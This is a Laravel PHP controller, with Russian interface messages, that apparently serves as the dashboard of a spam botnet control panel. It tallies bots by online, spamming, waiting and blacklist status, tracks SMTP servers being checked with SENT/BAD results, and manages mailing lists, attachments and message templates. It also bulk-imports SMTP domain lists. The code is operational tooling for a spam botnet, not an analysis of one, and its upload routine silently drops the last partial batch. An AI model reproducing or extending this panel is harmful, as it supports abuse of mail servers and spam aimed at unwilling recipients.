<?php

namespace App\Http\Controllers;

use App\Bots;
use App\PannelSettings;
use App\SMTP;
use App\SmtpListForCheck;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use narutimateum\Toastr\Facades\Toastr;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $data = [
            'themeInfo'   => Storage::has(config('config.theme')) ? "Файл " . config('config.theme') . " загружен" : "Файл " . config('config.theme') . " отсутствует",
            'messageInfo' => Storage::has(config('config.message')) ? "Файл " . config('config.message') . " загружен" : "Файл " . config('config.message') . " отсутствует",
            'smtpCount'   => SMTP::count(),
            'mailsFileCount' => count(Storage::files(config('config.emails.mails'))),
            'attachFileCount' => count(Storage::files(config('config.attach'))),
            'go_mailsFileCount' => count(Storage::files(config('config.emails.go_mails'))),
        ];

        $settings = PannelSettings::whereId(1)->first();

        $status = $settings->status;
        $checkBlackList = $settings->checkBlackList;

        $bots = Bots::paginate(config('config.bot_paginate'));
        $botsInfo = [];
        $botsInfo['online'] = Bots::where(['life'=>1])->count();
        $botsInfo['off'] = Bots::where(['otk'=>1])->count();
        $botsInfo['spam'] = Bots::where(['bot_status'=>1, 'life'=>1])->count();
        $botsInfo['wait'] = Bots::where(['bot_status'=>2, 'life'=>1])->count();
        $botsInfo['clear_online'] = Bots::where(['life'=>1,'black'=>0])->count();
        $botsInfo['black_online'] = Bots::where(['life'=>1,'black'=>1])->count();

        $smtpInfo = [];
        $smtpInfo['all'] = SmtpListForCheck::all()->count();
        $smtpInfo['needCheck'] = SmtpListForCheck::where(['isget'=>0])->count();
        $smtpInfo['inCheck'] = SmtpListForCheck::where('time', '<>', '')->count();
        $smtpInfo['good'] = SmtpListForCheck::where(['status'=>'SENT'])->count();
        $smtpInfo['bad'] = SmtpListForCheck::where(['status'=>'BAD'])->count();

//        $pool = [];
//        $pool[] = SmtpListForCheck::all()->count();
//        $pool[] = SmtpListForCheck::where(['isget'=>0])->count();
//        $pool[] = SmtpListForCheck::where('time', '<>', '')->count();
//        $pool[] = SmtpListForCheck::where(['status'=>'SENT'])->count();
//        $pool[] = SmtpListForCheck::where(['status'=>'BAD'])->count();


        return view('home.index', compact('data','status','bots','checkBlackList','botsInfo', 'smtpInfo'));
    }

    public function delete($name)
    {
        switch ($name) {
            case 'themefile' :
                Storage::delete(config('config.theme'));
                break;
            case 'messagefile' :
                Storage::delete(config('config.message'));
                break;
            case 'smtpclear' :
                DB::table('smtp')->truncate();
                break;
            case 'mailfilesclear':
                Storage::deleteDirectory(config('config.emails.mails'));
                Storage::makeDirectory(config('config.emails.mails'));
                break;
            case 'attachfilesclear':
                Storage::deleteDirectory(config('config.attach'));
                Storage::makeDirectory(config('config.attach'));
                break;
            case 'clearSmtpTable':
                DB::table('smtplistforcheck')->truncate();
                break;
        }

        return redirect(url('/'));
    }

    public function uploadSmtp()
    {
        if (empty(config('config.smtpFolder'))) {
            Toastr::error("Ключь smtpFolder отсутствует в config.php", "", $options = []);

            return redirect(url('/'));
        }

        if ( ! Storage::has(config('config.smtpFolder'))) {
            Toastr::error("Отсутствует папка " . config('config.smtpFolder'), "", $options = []);
            if (Storage::makeDirectory(config('config.smtpFolder'))) {
                Toastr::success("Папка " . config('config.smtpFolder') . " создана");
            }

            return redirect(url('/'));
        }

        $array = [];
        DB::table('smtp')->truncate();

        foreach (Storage::files(config('config.smtpFolder')) as $file) {
            foreach (explode("\n", Storage::get($file)) as $line) {
                $array[] = ['domen' => $line];

                if (count($array) > 100) {
                    SMTP::insert($array);
                    $array = [];
                }
            }
        }

        return redirect(url('/'));
    }

    public function test(){
        return view('home.test');
    }

}
